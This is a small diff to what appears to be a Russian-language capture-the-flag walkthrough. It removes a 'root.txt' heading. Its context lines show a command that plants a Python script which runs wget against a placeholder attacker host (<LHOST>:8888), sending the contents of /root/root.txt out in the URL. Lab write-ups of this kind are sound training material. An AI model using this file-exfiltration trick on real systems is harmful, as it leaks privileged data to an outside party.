@@ -354,7 +354,6 @@ Serving HTTP on 0.0.0.0 port 8888 ...
 sun@sun:~$ echo 'import os;os.system("wget http://<LHOST>:8888/$(cat /root/root.txt)");print "f4ckU!"' > Documents/script.py
 ```
 
-### root.txt
 Ждем ⩽ 5 минут, и, о чудо:
 ```text
 Serving HTTP on 0.0.0.0 port 8888 ...
